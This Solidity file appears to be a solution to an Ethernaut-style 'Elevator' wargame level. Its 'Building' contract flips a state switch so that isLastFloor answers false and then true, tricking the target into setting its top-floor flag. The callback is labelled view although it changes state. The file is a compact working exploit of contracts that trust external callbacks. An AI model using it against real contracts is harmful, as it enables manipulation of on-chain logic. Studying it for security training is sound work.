import "./Elevator.sol";

pragma solidity ^0.4.18;

contract Building {
    Elevator public el = Elevator(0xdb9cd4f70622510f87a737f4813f643f59e7ff0c);
    bool public switchFlipped =  false;

    function hack() public {
        el.goTo(1);
    }

    function isLastFloor(uint) view public returns (bool) {
        // first call
      if (! switchFlipped) {
        switchFlipped = true;
        return false;
        // second call
      } else {
        switchFlipped = false;
        return true;
      }
    }
}